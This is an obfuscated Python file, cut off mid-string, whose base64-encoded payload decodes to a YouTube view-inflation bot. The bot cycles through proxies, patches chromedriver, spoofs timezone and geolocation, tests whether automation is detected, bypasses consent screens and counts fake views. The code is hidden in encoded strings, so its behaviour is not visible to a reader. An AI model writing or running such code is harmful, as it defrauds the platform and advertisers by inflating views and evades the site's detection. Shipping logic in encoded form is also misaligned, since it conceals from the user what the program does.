# Python code by OnnoYukihiro

import base64, codecs
magic = ''
love = ''
god = '9zaXRpb24sIHlvdXR1YmUsIGRyaXZlciwgdmlld19zdGF0LCBjdXJyZW50X3VybCwgY3VycmVudF9jaGFubmVsKToKICAgIG9wdGlvbiA9IDEKICAgIGlmIHZpZXdfc3RhdCAhPSAnbXVzaWMnIGFuZCBkcml2ZXIuY3VycmVudF91cmwgPT0gY3VycmVudF91cmw6CiAgICAgICAgb3B0aW9uID0gY2hvaWNlcyhbMSwgMiwgM10sIGN1bV93ZWlnaHRzPSgwLjUsIDAuNzUsIDEuMDApLCBrPTEpWzBdCgogICAgICAgIGlmIG9wdGlvbiA9PSAyOgogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICBvdXRwdXQsIGxvZywgb3B0aW9uID0gcGxheV9mcm9tX2NoYW5uZWwoCiAgICAgICAgICAgICAgICAgICAgZHJpdmVyLCBjdXJyZW50X2NoYW5uZWwpCiAgICAgICAgICAgIGV4Y2VwdCBXZWJEcml2ZXJFeGNlcHRpb24gYXMgZToKICAgICAgICAgICAgICAgIHJhaXNlIEV4Y2VwdGlvbigKICAgICAgICAgICAgICAgICAgICBmIkVycm9yIGNoYW5uZWwgfCB7dHlwZShlKS5fX25hbWVfX30gfCB7ZS5hcmdzWzBdIGlmIGUuYXJncyBlbHNlICcnfSIpCgogICAgICAgICAgICBwcmludCh0aW1lc3RhbXAoKSArIGJjb2xvcnMuT0tCTFVFICsKICAgICAgICAgICAgICAgICAgZiJXb3JrZXIge3Bvc2l0aW9ufSB8IHtsb2d9IiArIGJjb2xvcnMuRU5EQykKCiAgICAgICAgICAgIGNyZWF0ZV9odG1sKHsiIzNiOGVlYSI6IGYiV29ya2VyIHtwb3NpdGlvbn0gfCB7bG9nfSJ9KQoKICAgICAgICBlbGlmIG9wdGlvbiA9PSAzOgogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICBvdXRwdXQgPSBwbGF5X2VuZF9zY3JlZW5fdmlkZW8oZHJpdmVyKQogICAgICAgICAgICBleGNlcHQgV2ViRHJpdmVyRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgICAgICAgICByYWlzZSBFeGNlcHRpb24oCiAgICAgICAgICAgICAgICAgICAgZiJFcnJvciBlbmQgc2NyZWVuIHwge3R5cGUoZSkuX19uYW1lX199IHwge2UuYXJnc1swXSBpZiBlLmFyZ3MgZWxzZSAnJ30iKQoKICAgICAgICAgICAgcHJpbnQodGltZXN0YW1wKCkgKyBiY29sb3JzLk9LQkxVRSArCiAgICAgICAgICAgICAgICAgIGYiV29ya2VyIHtwb3NpdGlvbn0gfCBWaWRlbyBkaXB1dGFyIGRhcmkgbGF5YXIgYWtoaXIgOiBbe291dHB1dH1dIiArIGJjb2xvcnMuRU5EQykKCiAgICAgICAgICAgIGNyZWF0ZV9odG1sKAogICAgICAgICAgICAgICAgeyIjM2I4ZWVhIjogZiJXb3JrZXIge3Bvc2l0aW9ufSB8IFZpZGVvIGRpcHV0YXIgZGFyaSBsYXlhciBha2hpciA6IFt7b3V0cHV0fV0ifSkKCiAgICAgICAgaWYgb3B0aW9uIGluIFsyLCAzXToKICAgICAgICAgICAgc2tpcF9pbml0aWFsX2FkKGRyaXZlciwgb3V0cHV0LCBkdXJhdGlvbl9kaWN0KQoKICAgICAgICAgICAgZmVhdHVyZXMoZHJpdmVyKQoKICAgICAgICAgICAgY3VycmVudF91cmwsIGN1cnJlbnRfY2hhbm5lbCA9IGNvbnRyb2xfcGxheWVyKAogICAgICAgICAgICAgICAgZHJpdmVyLCBvdXRwdXQsIHBvc2l0aW9uLCBwcm94eSwgeW91dHViZSwgY29sbGVjdF9pZD1GYWxzZSkKCiAgICAgICAgaWYgb3B0aW9uIGluIFsyLCAzLCA0XToKICAgICAgICAgICAgdXBkYXRlX3ZpZXdfY291bnQocG9zaXRpb24pCgoKZGVmIHdpbmRvd3Nfa2lsbF9kcml2ZXJzKCk6CiAgICBmb3IgcHJvY2VzcyBpbiBjb25zdHJ1Y3Rvci5XaW4zMl9Qcm9jZXNzKFsiQ29tbWFuZExpbmUiLCAiUHJvY2Vzc0lkIl0pOgogICAgICAgIHRyeToKICAgICAgICAgICAgaWYgJ1VzZXJBZ2VudENsaWVudEhpbnQnIGluIHByb2Nlc3MuQ29tbWFuZExpbmU6CiAgICAgICAgICAgICAgICBwcmludChmJ0tpbGxpbmcgUElEIDoge3Byb2Nlc3MuUHJvY2Vzc0lkfScsIGVuZD0iXHIiKQogICAgICAgICAgICAgICAgc3VicHJvY2Vzcy5Qb3BlbihbJ3Rhc2traWxsJywgJy9GJywgJy9QSUQnLCBmJ3twcm9jZXNzLlByb2Nlc3NJZH0nXSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3Rkb3V0PXN1YnByb2Nlc3MuUElQRSwgc3RkZXJyPXN1YnByb2Nlc3MuREVWTlVMTCwgc3RkaW49c3VicHJvY2Vzcy5ERVZOVUxMKQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgICAgIHBhc3MKICAgIHByaW50KCdcbicpCgoKZGVmIHF1aXRfZHJpdmVyKGRyaXZlciwgZGF0YV9kaXIpOgogICAgaWYgZHJpdmVyIGFuZCBkcml2ZXIgaW4gZHJpdmVyX2RpY3Q6CiAgICAgICAgZHJpdmVyLnF1aXQoKQogICAgICAgIGlmIGRhdGFfZGlyIGluIHRlbXBfZm9sZGVyczoKICAgICAgICAgICAgdGVtcF9mb2xkZXJzLnJlbW92ZShkYXRhX2RpcikKCiAgICBwcm94eV9mb2xkZXIgPSBkcml2ZXJfZGljdC5wb3AoZHJpdmVyLCBOb25lKQogICAgaWYgcHJveHlfZm9sZGVyOgogICAgICAgIHNodXRpbC5ybXRyZWUocHJveHlfZm9sZGVyLCBpZ25vcmVfZXJyb3JzPVRydWUpCgogICAgc3RhdHVzID0gNDAwCiAgICByZXR1cm4gc3RhdHVzCgoKZGVmIG1haW5fdmlld2VyKHByb3h5X3R5cGUsIHByb3h5LCBwb3NpdGlvbik6CiAgICBnbG9iYWwgd2lkdGgsIHZpZXdwb3J0cwogICAgZHJpdmVyID0gTm9uZQogICAgZGF0YV9kaXIgPSBOb25lCgogICAgaWYgY2FuY2VsX2FsbDoKICAgICAgICByYWlzZSBLZXlib2FyZEludGVycnVwdAoKICAgIHRyeToKICAgICAgICBkZXRlY3RfZmlsZV9jaGFuZ2UoKQoKICAgICAgICBjaGVja2VkW3Bvc2l0aW9uXSA9IE5vbmUKCiAgICAgICAgaGVhZGVyID0gSGVhZGVycygKICAgICAgICAgICAgYnJvd3Nlcj0iY2hyb21lIiwKICAgICAgICAgICAgb3M9b3NuYW1lLAogICAgICAgICAgICBoZWFkZXJzPUZhbHNlCiAgICAgICAgKS5nZW5lcmF0ZSgpCiAgICAgICAgYWdlbnQgPSBoZWFkZXJbJ1VzZXItQWdlbnQnXQoKICAgICAgICB1cmwsIG1ldGhvZCwgeW91dHViZSwga2V5d29yZCwgdmlkZW9fdGl0bGUgPSBkaXJlY3Rfb3Jfc2VhcmNoKHBvc2l0aW9uKQoKICAgICAgICBpZiBjYXRlZ29yeSA9PSAncicgYW5kIHByb3h5X2FwaToKICAgICAgICAgICAgZm9yIF8gaW4gcmFuZ2UoMjApOgogICAgICAgICAgICAgICAgcHJveHkgPSBjaG9pY2UocHJveGllc19mcm9tX2FwaSkKICAgICAgICAgICAgICAgIGlmIHByb3h5IG5vdCBpbiB1c2VkX3Byb3hpZXM6CiAgICAgICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgdXNlZF9wcm94aWVzLmFwcGVuZChwcm94eSkKCiAgICAgICAgc3RhdHVzID0gY2hlY2tfcHJveHkoY2F0ZWdvcnksIGFnZW50LCBwcm94eSwgcHJveHlfdHlwZSkKCiAgICAgICAgaWYgc3RhdHVzICE9IDIwMDoKICAgICAgICAgICAgcmFpc2UgUmVxdWVzdEV4Y2VwdGlvbihzdGF0dXMpCgogICAgICAgIHRyeToKICAgICAgICAgICAgcHJpbnQodGltZXN0YW1wKCkgKyBiY29sb3JzLk9LQkxVRSArIGYiV29ya2VyIHtwb3NpdGlvbn0gfCAiICsgYmNvbG9ycy5PS0dSRUVOICsKICAgICAgICAgICAgICAgICAgZiJ7cHJveHl9IHwge3Byb3h5X3R5cGUudXBwZXIoKX0gfCBHb29kIFByb3h5IHwgTWVtYnVrYSBkcml2ZXIgYmFydS4uLiIgKyBiY29sb3JzLkVOREMpCgogICAgICAgICAgICBjcmVhdGVfaHRtbCh7IiMzYjhlZWEiOiBmIldvcmtlciB7cG9zaXRpb259IHwgIiwKICAgICAgICAgICAgICAgICAgICAgICAgIiMyM2QxOGIiOiBmIntwcm94eS5zcGxpdCgnQCcpWy0xXX0gfCB7cHJveHlfdHlwZS51cHBlcigpfSB8IEdvb2QgUHJveHkgfCBPcGVuaW5nIGEgbmV3IGRyaXZlci4uLiJ9KQoKICAgICAgICAgICAgd2hpbGUgcHJveHkgaW4gYmFkX3Byb3hpZXM6CiAgICAgICAgICAgICAgICBiYWRfcHJveGllcy5yZW1vdmUocHJveHkpCiAgICAgICAgICAgICAgICBzbGVlcCgxKQoKICAgICAgICAgICAgcGF0Y2hlZF9kcml2ZXIgPSBvcy5wYXRoLmpvaW4oCiAgICAgICAgICAgICAgICBwYXRjaGVkX2RyaXZlcnMsIGYnY2hyb21lZHJpdmVyX3twb3NpdGlvbiV0aHJlYWRzfXtleGVfbmFtZX0nKQoKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgUGF0Y2hlcihleGVjdXRhYmxlX3BhdGg9cGF0Y2hlZF9kcml2ZXIpLnBhdGNoX2V4ZSgpCiAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgICAgICAgICBwYXNzCgogICAgICAgICAgICBwcm94eV9mb2xkZXIgPSBvcy5wYXRoLmpvaW4oCiAgICAgICAgICAgICAgICBjd2QsICdleHRlbnNpb24nLCBmJ3Byb3h5X2F1dGhfe3Bvc2l0aW9ufScpCgogICAgICAgICAgICBmYWN0b3IgPSBpbnQodGhyZWFkcy8oMC4xKnRocmVhZHMgKyAxKSkKICAgICAgICAgICAgc2xlZXBfdGltZSA9IGludCgoc3RyKHBvc2l0aW9uKVstMV0pKSAqIGZhY3RvcgogICAgICAgICAgICBzbGVlcChzbGVlcF90aW1lKQogICAgICAgICAgICBpZiBjYW5jZWxfYWxsOgogICAgICAgICAgICAgICAgcmFpc2UgS2V5Ym9hcmRJbnRlcnJ1cHQKCiAgICAgICAgICAgIGRyaXZlciA9IGdldF9kcml2ZXIoYmFja2dyb3VuZCwgdmlld3BvcnRzLCBhZ2VudCwgYXV0aF9yZXF1aXJlZCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXRjaGVkX2RyaXZlciwgcHJveHksIHByb3h5X3R5cGUsIHByb3h5X2ZvbGRlcikKCiAgICAgICAgICAgIGRyaXZlcl9kaWN0W2RyaXZlcl0gPSBwcm94eV9mb2xkZXIKCiAgICAgICAgICAgIGRhdGFfZGlyID0gZHJpdmVyLmNhcGFiaWxpdGllc1snY2hyb21lJ11bJ3VzZXJEYXRhRGlyJ10KICAgICAgICAgICAgdGVtcF9mb2xkZXJzLmFwcGVuZChkYXRhX2RpcikKCiAgICAgICAgICAgIHNsZWVwKDIpCgogICAgICAgICAgICBpbmZvID0gc3Bvb2ZfdGltZXpvbmVfZ2VvbG9jYXRpb24ocHJveHlfdHlwZSwgcHJveHksIGRyaXZlcikKCiAgICAgICAgICAgIGlzZGV0ZWN0ZWQgPSBkcml2ZXIuZXhlY3V0ZV9zY3JpcHQoJ3JldHVybiBuYXZpZ2F0b3Iud2ViZHJpdmVyJykKCiAgICAgICAgICAgIHByaW50KHRpbWVzdGFtcCgpICsgYmNvbG9ycy5PS0JMVUUgKyBmIldvcmtlciB7cG9zaXRpb259IHwgIiArIGJjb2xvcnMuT0tHUkVFTiArCiAgICAgICAgICAgICAgICAgIGYie3Byb3h5fSB8IHtwcm94eV90eXBlLnVwcGVyKCl9IHwgIiArIGJjb2xvcnMuT0tDWUFOICsgZiJ7aW5mb30gfCBEZXRlY3RlZD8gOiB7aXNkZXRlY3RlZH0iICsgYmNvbG9ycy5FTkRDKQoKICAgICAgICAgICAgY3JlYXRlX2h0bWwoeyIjM2I4ZWVhIjogZiJXb3JrZXIge3Bvc2l0aW9ufSB8ICIsCiAgICAgICAgICAgICAgICAgICAgICAgICIjMjNkMThiIjogZiJ7cHJveHkuc3BsaXQoJ0AnKVstMV19IHwge3Byb3h5X3R5cGUudXBwZXIoKX0gfCAiLCAiIzI5YjJkMyI6IGYie2luZm99IHwgRGV0ZWN0ZWQ/IDoge2lzZGV0ZWN0ZWR9In0pCgogICAgICAgICAgICBpZiB3aWR0aCA9PSAwOgogICAgICAgICAgICAgICAgd2lkdGggPSBkcml2ZXIuZXhlY3V0ZV9zY3JpcHQoJ3JldHVybiBzY3JlZW4ud2lkdGgnKQogICAgICAgICAgICAgICAgaGVpZ2h0ID0gZHJpdmVyLmV4ZWN1dGVfc2NyaXB0KCdyZXR1cm4gc2NyZWVuLmhlaWdodCcpCiAgICAgICAgICAgICAgICBwcmludChmJ0Rpc3BsYXkgcmVzb2x1dGlvbiA6IHt3aWR0aH14e2hlaWdodH0nKQogICAgICAgICAgICAgICAgdmlld3BvcnRzID0gW2kgZm9yIGkgaW4gdmlld3BvcnRzIGlmIGludChpWzo0XSkgPD0gd2lkdGhdCgogICAgICAgICAgICBzZXRfcmVmZXJlcihwb3NpdGlvbiwgdXJsLCBtZXRob2QsIGRyaXZlcikKCiAgICAgICAgICAgIGlmICdjb25zZW50JyBpbiBkcml2ZXIuY3VycmVudF91cmw6CiAgICAgICAgICAgICAgICBwcmludCh0aW1lc3RhbXAoKSArIGJjb2xvcnMuT0tCTFVFICsKICAgICAgICAgICAgICAgICAgICAgIGYiV29ya2VyIHtwb3NpdGlvbn0gfCBNZWxld2F0aSBwZXJzZXR1anVhbi4uLiIgKyBiY29sb3JzLkVOREMpCgogICAgICAgICAgICAgICAgY3JlYXRlX2h0bWwoCiAgICAgICAgICAgICAgICAgICAgeyIjM2I4ZWVhIjogZiJXb3JrZXIge3Bvc2l0aW9ufSB8IE1lbGV3YXRpIHBlcnNldHVqdWFuLi4uIn0pCgogICAgICAgICAgICAgICAgYnlwYXNzX2NvbnNlbnQoZHJpdmVyKQoKICAgICAgICAgICAgaWYgdmlkZW9fdGl0bGU6CiAgICAgICAgICAgICAgICBvdXRwdXQgPSB2aWRlb190aXRsZQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgb3V0cHV0ID0gZHJpdmVyLnRpdGxlWzotMTBdCgogICAgICAgICAgICBpZiB5b3V0dWJlID09ICdWaWRlbyc6CiAgICAgICAgICAgICAgICB2aWV3X3N0YXQgPSB5b3V0dWJlX25vcm1hbCgKICAgICAgICAgICAgICAgICAgICBtZXRob2QsIGtleXdvcmQsIHZpZGVvX3RpdGxlLCBkcml2ZXIsIG91dHB1dCkKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIHZpZXdfc3RhdCwgb3V0cHV0ID0geW91dHViZV9tdXNpYyhkcml2ZXIpCgogICAgICAgICAgICBpZiAnd2F0Y2hpbmcnIGluIHZpZXdfc3RhdDoKICAgICAgICAgICAgICAgIHlvdXR1YmVfbGl2ZShwcm94eSwgcG9zaXRpb24sIGRyaXZlciwgb3V0cHV0KQoKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIGN1cnJlbnRfdXJsLCBjdXJyZW50X2NoYW5uZWwgPSBtdXNpY19hbmRfdmlkZW8oCiAgICAgICAgICAgICAgICAgICAgcHJveHksIHBvc2l0aW9uLCB5b3V0dWJlLCBkcml2ZXIsIG91dHB1dCwgdmlld19zdGF0KQoKICAgICAgICAgICAgY2hhbm5lbF9vcl9lbmRzY3JlZW4ocHJveHksIHBvc2l0aW9uLCB5b3V0dWJlLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkcml2ZXIsIHZpZXdfc3RhdCwgY3VycmVudF91cmwsIGN1cnJlbnRfY2hhbm5lbCkKCiAgICAgICAgICAgIGlmIHJhbmRpbnQoMSwgMikgPT0gMToKICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICBkcml2ZXIuZmluZF9lbGVtZW50KEJ5LklELCAnbW92aWVfcGxheWVyJykuc2VuZF9rZXlzKCdrJykKICAgICAgICAgICAgICAgIGV4Y2VwdCBXZWJEcml2ZXJFeGNlcHRpb246CiAgICAgICAgICAgICAgICAgICAgcGFzcwoKICAgICAgICAgICAgc3RhdHVzID0gcXVpdF9kcml2ZXIoZHJpdmVyPWRyaXZlciwgZGF0YV9kaXI9ZGF0YV9kaXIpCgogICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICAgICAgc3RhdHVzID0gcXVpdF9kcml2ZXIoZHJpdmVyPWRyaXZlciwgZGF0YV9kaXI9ZGF0YV9kaXIpCgogICAgICAgICAgICBwcmludCh0aW1lc3RhbXAoKSArIGJjb2xvcnMuRkFJTCArCiAgICAgICAgICAgICAgICAgIGYiV29ya2VyIHtwb3NpdGlvbn0gfCBMaW5lIDoge2UuX190cmFjZWJhY2tfXy50Yl9saW5lbm99IHwge3R5cGUoZSkuX19uYW1lX199IHwge2UuYXJnc1swXSBpZiBlLmFyZ3MgZWxzZSAnJ30iICsgYmNvbG9ycy5FTkRDKQoKICAgICAgICAgICAgY3JlYXRlX2h0bWwoCiAgICAgICAgICAgICAgICB7IiNmMTRjNGMiOiBmIldvcmtlciB7cG9zaXRpb259IHwgTGluZSA6IHtlLl9fdHJhY2ViYWNrX18udGJfbGluZW5vfSB8IHt0eXBlKGUpLl9fbmFtZV9ffSB8IHtlLmFyZ3NbMF0gaWYgZS5hcmdzIGVsc2UgJyd9In0pCgogICAgZXhjZXB0IFJlcXVlc3RFeGNlcHRpb246CiAgICAgICAgcHJpbnQodGltZXN0YW1wKCkgKyBiY29sb3JzLk9LQkxVRSArIGYiV29ya2VyIHtwb3NpdGlvbn0gfCAiICsKICAgICAgICAgICAgICBiY29sb3JzLkZBSUwgKyBmIntwcm94eX0gfCB7cHJveHlfdHlwZS51cHBlcigpfSB8IEJhZCBwcm94eSAiICsgYmNvbG9ycy5FTkRDKQoKICAgICAgICBjcmVhdGVfaHRtbCh7IiMzYjhlZWEiOiBmIldvcmtlciB7cG9zaXRpb259IHwgIiwKICAgICAgICAgICAgICAgICAgICAgIiNmMTRjNGMiOiBmIntwcm94eS5zcGxpdCgnQCcpWy0xXX0gfCB7cHJveHlfdHlwZS51cHBlcigpfSB8IEJhZCBwcm94eSAifSkKCiAgICAgICAgY2hlY2tlZFtwb3NpdGlvbl0gPSBwcm94eV90eXBlCiAgICAgICAgYmFkX3Byb3hpZXMuYXBwZW5kKHByb3h5KQoKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICBwcmludCh0aW1lc3RhbXAoKSArIGJjb2xvcnMuRkFJTCArCiAgICAgICAgICAgICAgZiJXb3JrZXIge3Bvc2l0aW9ufSB8IExpbmUgOiB7ZS5fX3RyYWNlYmFja19fLnRiX2xpbmVub30gfCB7dHlwZShlKS5fX25hbWVfX30gfCB7ZS5hcmdzWzBdIGlmIGUuYXJncyBlbHNlICcnfSIgKyBiY29sb3JzLkVOREMpCgogICAgICAgIGNyZWF0ZV9odG1sKAogICAgICAgICAgICB7IiNmMTRjNGMiOiBmIldvcmtlciB7cG9zaXRpb259IHwgTGluZSA6IHtlLl9fdHJhY2ViYWNrX18udGJfbGluZW5vfSB8IHt0eXBlKGUpLl9fbmFtZV9ffSB8IHtlLmFyZ3NbMF0gaWYgZS5hcmdzIGVsc2UgJyd9In0pCgoKZGVmIGdldF9wcm94eV9saXN0KCk6CiAgICBpZiBmaWxlbmFtZToKICAgICAgICBpZiBjYXRlZ29yeSA9PSAncic6CiAgICAgICAgICAgIGZhY3RvciA9IG1heF90aHJlYWRzIGlmIG1heF90aHJlYWRzID4gMTAwMCBlbHNlIDEwMDAKICAgICAgICAgICAgcHJveHlfbGlzdCA9IFtmaWxlbmFtZV0gKiBmYWN0b3IKICAgICAgICBlbHNlOgogICAgICAgICAgICBpZiBwcm94eV9hcGk6CiAgICAgICAgICAgICAgICBwcm94eV9saXN0ID0gc2NyYXBlX2FwaShmaWxlbmFtZSkKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIHByb3h5X2xpc3QgPSBsb2FkX3Byb3h5KGZpbGVuYW1lKQoKICAgIGVsc2U6CiAgICAgICAgcHJveHlfbGlzdCA9IGdhdGhlcl9wcm94eSgpCgogICAgcmV0dXJuIHByb3h5X2xpc3QKCgpkZWYgc3RvcF9zZXJ2ZXIoaW1tZWRpYXRlPUZhbHNlKToKICAgIGlmIG5vdCBpbW1lZGlhdGU6CiAgICAgICAgcHJpbnQoJ01lbWJpYXJrYW4gbWFrc2ltYWwgMTUgbWVuaXQgdW50dWsgbWVueWVsZXNhaWthbiBzZW11YSBkcml2ZXIgeWFuZyBiZXJqYWxhbi4uLicpCiAgICAgICAgZm9yIF8gaW4gcmFuZ2UoMTgwKToKICAgICAgICAgICAgc2xlZXAoNSkKICAgICAgICAgICAgaWYgJ3N0YXRlPXJ1bm5pbmcnIG5vdCBpbiBzdHIoZnV0dXJlc1sxOi0xXSk6CiAgICAgICAgICAgICAgICBicmVhawoKICAgIGlmIGFwaToKICAgICAgICBmb3IgXyBpbiByYW5nZSgxMCk6CiAgICAgICAgICAgIHJlc3BvbnNlID0gcmVxdWVzdHMucG9zdChmJ2h0dHA6Ly8xMjcuMC4wLjE6e3BvcnR9L3NodXRkb3duJykKICAgICAgICAgICAgaWYgcmVzcG9uc2Uuc3RhdHVzX2NvZGUgPT0gMjAwOgogICAgICAgICAgICAgICAgcHJpbnQoJ1NlcnZlciBzaHV0IGRvd24gc3VjY2Vzc2Z1bGx5IScpCiAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgcHJpbnQoZidTZXJ2ZXIgc2h1dCBkb3duIGVycm9yIDoge3Jlc3Bvb'
destiny = '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